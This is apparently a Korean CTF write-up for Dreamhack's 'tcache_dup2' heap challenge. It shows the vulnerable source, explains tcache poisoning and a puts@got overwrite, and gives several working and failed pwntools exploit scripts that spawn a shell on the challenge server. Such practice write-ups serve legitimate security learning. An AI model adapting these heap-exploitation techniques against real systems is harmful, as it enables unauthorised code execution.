# 바이너리 분석

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[7];

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void create_heap(int idx)
{
    size_t size;

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    ptr[idx] = malloc(size);

    if (!ptr[idx])
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size - 1);
}

void modify_heap()
{
    size_t size, idx;

    printf("idx: ");
    scanf("%ld", &idx);

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    if (size > 0x10)
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size);
}

void delete_heap()
{
    size_t idx;

    printf("idx: ");
    scanf("%ld", &idx);
    if (idx >= 7)
        exit(0);

    if (!ptr[idx])
        exit(0);

    free(ptr[idx]);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    int idx;
    int i = 0;

    initialize();

    while (1)
    {
        printf("1. Create heap\n");
        printf("2. Modify heap\n");
        printf("3. Delete heap\n");
        printf("> ");

        scanf("%d", &idx);

        switch (idx)
        {
        case 1:
            create_heap(i);
            i++;
            break;
        case 2:
            modify_heap();
            break;
        case 3:
            delete_heap();
            break;
        default:
            break;
        }
    }
}

```

<img width="564" alt="image" src="https://github.com/user-attachments/assets/6295ce67-c2ba-4bde-a31b-147d1bd79940">
 
먼저 해당 바이너리에는 `Tcache poisoning`과 `GOT overwrite` 취약점을 유발하는 아래의 함수들이 존재한다. (`Partial RELRO`, `NO PIE`이기 때문에 `GOT Overwrite` 가능)

1. `malloc`하며 값을 대입할 수 있는 함수인 `void create_heap(int idx)`

2. `malloc`으로 할당 한 `ptr`의 특정 `idx`를 정해서 값을 대입할 수 있는 `void modify_heap()` : `tcache poisoning`을 유발

3. `ptr`의 특정 `idx`를 정해서 원하는 청크를 `free`할 수 있는 `void delete_heap()`

4. 쉘을 실행할 수 있는 `void get_shell()`

위 함수들을 통해서 처음에는 `tcache_dup` 워게임과 `Tcache Poisoning` 문제처럼 익스플로잇 설계를 했던 내용은 아래와 같다.

1. `create` -> `delete`를 통해 청크 하나를 할당 후 해제

2. 해제한 청크의 데이터를 `modify`를 통해 수정하여 overwrite할 `printf@got` 함수의 주소를 대입 : `tcache`에 `printf@got`의 주소가 추가됨 (`printf`가 함수를 고르는 메뉴를 출력할 때 사용되기 때문)

3. `create`로 첫 번째 청크를 빼고, 다시 `create`로 `printf@got` 주소를 빼면서 `get_shell`의 주소를 대입하여 `GOT overwrite` 완료

이전 워게임 문제에서는 이렇게 익스플로잇을 해도 전부 잘 됬는데, 이번 문제에서는 이렇게 해도 익스플로잇이 실패했다.

## 실패 이유 1. : `ex_wrong1.py`

**그 이유는 더 공부해봐야 하겠지만 `tcache`에 청크를 추가하고 뺄 때 조작하는, `tc_idx` 값과 관련이 있었다.** [참고](https://learn.dreamhack.io/34#2)

`free`를 통해 `tcache`에 청크를 추가할 때는 `tc_idx` 값이 `1`증가하게 되고, `malloc`을 통해 `tcache`에서 청크를 빼내올 때는 `tc_idx` 값이 `1` 감소하게 된다. (참고로, `modify`로 `tcache poisoning`을 통해 `next`를 조작하여 청크를 추가할 때는 변하지 않는다.)

**그런데 여기서 중요한 점이 `malloc`을 통해 청크를 할당할 때, `tc_idx` 값이 초기 값인 `0`인 경우, 해당 청크를 `tcache`에서 가져오지 않고 `unsorted bins`에서 가져오게 된다고 한다.**

따라서, 이렇게 되면 `tcache_poisoning`을 통해 추가했던 청크를 가져오지 않기 때문에 추가한 `got` 주소를 제대로 가져올 수 없게 된다.

**그래서 `Tcache Poisoning`을 할 때, 항상 `Double Free`를 해줘야 하는 이유이다.** `ex-1.py` 처럼 `Double Free` 이후에 바로 `modify`를 해줘서 `tc_idx`를 계속 `1` 이상으로 유지해줘도 되고,\
(`Double Free` 이후, 바로 `edit`으로 청크를 추가하지 않고 `create`로 빼주고 청크를 추가하면 `ex-wrong4.py`처럼 `tc_idx`가 마지막에 `create` 전에 `0`이 되어서 실패함)

`ex-2.py`처럼 `create`를 연속 2번 해서 서로 다른 2개의 청크를 만든 후, `delete`를 2번 해줘서 `Double Free` 없이 `tcache`에 청크를 2개 추가하여 `tc_idx = 2`로 만들어준 후,

위의 `1. 2. 3.` 과정을 다시 진행해주면 `tc_idx`의 영향을 받지 않고 정상적으로 익스플로잇 할 수 있다. 여기서도 당연히 `tc_idx = 2`에서 `modify`부터 해야 `tc_idx >= 1`이 유지된다.\
(**이걸로는 부족하기 때문에 아래의 실패 이유 2.도 잘 봐야함**)

`tcache_dup`와 `Tcache Poisoning` 문제에서는 `Ubuntu 18.04, libc-2.27.so` 버전이었지만, 이번 문제에서는 `Ubuntu 19.10, libc-2.30.so`라 `tc_idx`의 도입 여부로 인해 차이가 생기는 듯하다.

**버전에 상관없이 `malloc`을 연속 2번 해주고, `free`를 2번 해주는 것은 익스플로잇 과정에 영향을 주지 않기 때문에 일단 `Tcache Poisoning` 관련 문제에서는 전부 해주는 습관을 갖자.**

## 실패 이유 2. : `ex_wrong2.py`

**실패 이유 1.** 대로 수정해준 `ex_wrong2.py`에서도 익스플로잇이 실패하는 현상이 발생했다.

**그 이유는 `malloc`을 할 때, `chunk + 0x8`의 주소인 `key` 값에 `NULL`을 대입해주는 `e->key == NULL` 코드와, `printf@got`의 위치 때문이다.**

`printf@got`를 할당할 때, 앞에서 말했듯이 `printf@got + 8`의 주소에 `NULL(0x00)`을 대입해주게 된다.

그런데 `gdb`를 통해 아래와 같이 살펴보면, `printf@got + 8`에는 `read@got`가 존재한다. 

<img width="273" alt="image" src="https://github.com/user-attachments/assets/0fb2c552-9552-4c96-82f7-cde0bb7ea0d7">

![image](https://github.com/user-attachments/assets/9c632830-83d3-4f59-90bd-7ac9c61fe7f1)

(`info func`에서 `plt` 주소가 연속되어 있으면, `got` 주소도 연속되어 있어서 `info func`로도 바로 확인 가능하다.)

따라서, `printf@got`에 `get_shell` 함수의 주소를 대입해주는 `create(0x20, p64(get_shell))` 코드를 익스플로잇하게 되면 `read@got`가 변조되어 `read` 함수가 제대로 수행되지 않고, 이러면 `get_shell`의 주소를 대입해줄 수 없게 된다.

결국 `printf@got`의 값에는 변함이 없이 `GOT overwrite`가 실패하게 되고, `read@got` 값만 이상한 `0x00`으로 변하게 되어 익스플로잇이 실패한다.

참고로, `tcache_dup`에서는 `printf@got` overwrite이 가능했던 이유가 `printf@got + 0x8`에 익스플로잇 과정에서는 호출되지 않는 `alarm@got`가 존재하기 때문이다.

![image](https://github.com/user-attachments/assets/928d3108-4d6d-4498-ac60-c94eec019a1f)


## 실패 이유 3. : ``ex_wrong3.py`

그럼 `printf@got` 대신 어떤 `got`를 overwrite 하는게 좋을지 바이너리에서 찾아보던 중 `free@got`를 발견했다.

`delete`에서 `free`를 호출하기 때문에, `free@got`를 `overwrite`한 후 `delete(0)`을 호출하면 되겠다는 생각으로 익스플로잇을 작성했지만, 여전히 익스플로잇이 실패했다.

그 이유는 **실패 이유 2.** 에서와 같은데, `free@got + 0x8`에는 `puts@got`가 존재한다.

**처음에 바이너리 소스 코드를 보고 `puts@got`가 존재하지 않아서 상관없겠구나라고 생각했는데, 컴파일 과정에서 `printf("abc")`와 같이 포맷 스트링 없이 문자열만 사용된 경우 `puts` 함수로 변형하여 최적화되기도 한다는 사실을 모르고 있었던 것이다.**

<img width="639" alt="image" src="https://github.com/user-attachments/assets/eaf02dbd-1327-4229-99a7-5259d9686bd5">

```
printf("1. Create heap\n");
printf("2. Modify heap\n");
printf("3. Delete heap\n");
```

로컬에서 확인해봤을 때는 `puts`로 변환되었고, 원격에서는 아래의 에러가 뜨는 것을 보아, `printf("> ");`도 변환된 것으로 보인다.

<img width="971" alt="image" src="https://github.com/user-attachments/assets/cb3ad2f4-62cd-427b-b010-3d5e9d443d84">

따라서, `free@got`를 overwrite 하는 방법도 불가능하기 때문에, 그럼 오히려 `puts@got`를 `overwrite` 하면 되겠다는 생각으로 `ex.py` 익스플로잇 코드를 작성하였다.
 
`puts@got`는 위의 이미지에서 보듯이 뒤에 카나리가 변조되었을 때 호출되는 `__stack_chk_fail@got`이 존재하기 때문이다.

# Exploit : `ex-1.py`

```
from pwn import *

p = remote('host3.dreamhack.games', 21924)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[0]
delete(0)


# tcache[0x20] : ptr[0] -> b'aaaaaaaa'
# tc_idx = 1
# chunk : ptr[0]
modify(0, 0x10, b'a'*0x9)


# tcache[0x20] : ptr[0] -> ptr[0] + 0x10
# tc_idx = 2
# chunk : ptr[0]
delete(0)


# tcache[0x20] : ptr[0] -> puts@got
# tc_idx = 2
# chunk : ptr[0]
puts_got = elf.got['puts']
modify(0, 0x10, p64(puts_got))


# tcache[0x20] : puts@got
# tc_idx = 1
# chunk : ptr[1]
create(0x20, b'a')


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))

p.interactive()
```

# Exploit : `ex-2.py`

```
from pwn import *

p = remote('host3.dreamhack.games', 17171)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# malloc -> free를 2번 연속으로 해줘서 tc_idx = 2으로 만든 후, tcache_poisoning에서 tc_idx = 0이 되지 않도록 세팅
# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')
# tcache[0x20] : empty
# chunk : ptr[1]
create(0x20, b'b')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[1]
delete(0)
# tcache[0x20] : ptr[1] -> ptr[0]
# tc_idx = 2
# chunk : ptr[1]
delete(1)


# tcache[0x20] : ptr[1] -> puts@got
# tc_idx = 2
# chunk : ptr[1]
puts_got = elf.got['puts']
modify(1, 0x10, p64(puts_got))


# tcache[0x20] : puts@got
# tc_idx = 1
# chunk : ptr[2]
create(0x20, b'a')


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))

p.interactive()
```

# `ex_wrong1.py`

```
from pwn import *

p = remote('host3.dreamhack.games', 17171)
e = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[0]
delete(0)


# tcache[0x20] : ptr[0] -> printf@got
# tc_idx = 1
# chunk : ptr[0]
printf_got = e.got['printf']
modify(0, 0x10, p64(printf_got))


# tcache[0x20] : printf@got
# tc_idx = 0
# chunk : ptr[1]
create(0x20, b'a')


# 여기서 (tc_idx = 0)이기 때문에, printf@got가 malloc되지 않음
# tcache[0x20] : printf@got
# tc_idx = 0
# chunk : ptr[2]
get_shell = e.symbols['get_shell']
create(0x20, p64(get_shell))

p.interactive()
```

# `ex_wrong2.py`

```
from pwn import *

p = remote('host3.dreamhack.games', 17171)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')
# tcache[0x20] : empty
# chunk : ptr[1]
create(0x20, b'b')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[1]
delete(0)
# tcache[0x20] : ptr[1] -> ptr[0]
# tc_idx = 2
# chunk : ptr[1]
delete(1)


# tcache[0x20] : ptr[1] -> printf@got
# tc_idx = 2
# chunk : ptr[1]
printf_got = elf.got['printf']
modify(1, 0x10, p64(printf_got))


# tcache[0x20] : printf@got
# tc_idx = 1
# chunk : ptr[2]
create(0x20, b'a')


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))
# tcache에서 청크를 찾아서 할당할 때 해당 청크에 `e->key = NULL;`을 해서 `청크 + 0x8`을 `0x00`으로 초기화하기 때문에,
# 여기서 printf@got를 할당할 때, [printf@got + 0x8]에 위치하는 read@got의 값이 NULL(0x00)으로 바뀜
# tcache_dup 워게임에서는 printf@got 뒤에 alarm@got가 존재해서 상관없지만, 여기서는 create 내부에서 read로 데이터에 get_shell을 대입해야 하므로 read@got를 수정하면 안됨

p.interactive()
```

# `ex_wrong3.py`

```
from pwn import *

p = remote('host3.dreamhack.games', 14896)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')
# tcache[0x20] : empty
# chunk : ptr[1]
create(0x20, b'b')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[1]
delete(0)
# tcache[0x20] : ptr[1] -> ptr[0]
# tc_idx = 2
# chunk : ptr[1]
delete(1)


# tcache[0x20] : ptr[1] -> free@got
# tc_idx = 2
# chunk : ptr[1]
free_got = elf.got['free']
modify(1, 0x10, p64(free_got))


# tcache[0x20] : free@got
# tc_idx = 1
# chunk : ptr[2]
create(0x20, b'a')


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))
# tcache에서 청크를 찾아서 할당할 때 해당 청크에 `e->key = NULL;`을 해서 `청크 + 0x8`을 `0x00`으로 초기화하기 때문에,
# 여기서 free@got를 할당할 때, [free@got + 0x8]에 위치하는 puts@got의 값이 NULL(0x00)으로 바뀜
# 사실 puts가 해당 바이너리에서 쓰이지 않지만, gdb를 통해서 확인해보면, `printf`에 포맷 스트링이 아닌 문자열만 쓰이는 경우 최적화를 통해 puts가 호출되는 경우가 있음
# 따라서 여기서 puts@got가 바뀌면, puts로 바뀐 printf 들이 출력이 안되서, `recvafter`에서 무한대기해서 아래로 못내려감

delete(0)

p.interactive()
```

# `ex.wrong4.py`

참고로 `Double Free`를 통해 처음에 `tc_idx = 2`로 만들어주더라도, 바로 `edit` 으로 중복된 청크를 날리지 않고 `create`를 해주면 마지막에 `tc_idx = 0`인 상태에서 `GOT Overwrite`를 하게 되어서 익스플로잇에 성공하지 않게 된다.

```
from pwn import *

p = remote('host3.dreamhack.games', 21924)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[0]
delete(0)


# tcache[0x20] : ptr[0] -> b'aaaaaaaa'
# tc_idx = 1
# chunk : ptr[0]
modify(0, 0x10, b'a'*0x9)


# tcache[0x20] : ptr[0] -> ptr[0] + 0x10
# tc_idx = 2
# chunk : ptr[0]
delete(0)


# tcache[0x20] : ptr[0] -> puts@got
# tc_idx = 1
# chunk : ptr[1]
puts_got = elf.got['puts']
create(0x20, p64(puts_got))


# tcache[0x20] : puts@got
# tc_idx = 0
# chunk : ptr[2]
create(0x20, b'a')

# 여기서 tcache를 통해 가져오지 않게 됨
# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))

p.interactive()
```

### 참고

이번 문제에서는 이 경우는 아니지만, 일반적으로 `GOT overwrite`에 성공하였으나 공격이 실패하는 경우는 아래와 같다.

1. 함수 호출 시 `인자`가 올바르지 않은 경우.

예를 들어, `printf("%s", &a)`의 `printf@got`를 `system()`으로 덮은 경우, `system("%s")`가 실행되어 공격에 실패한다.

2. `stack` 정렬이 되어 있지 않아, `xmm`오류가 발생하는 경우

일반적으로, 함수의 시작점으로 `got`를 덮은 경우 오류가 발생하지 않는다. 다만 함수의 **중간**으로 이동하는 경우 해당 오류가 발생할 수 있다.
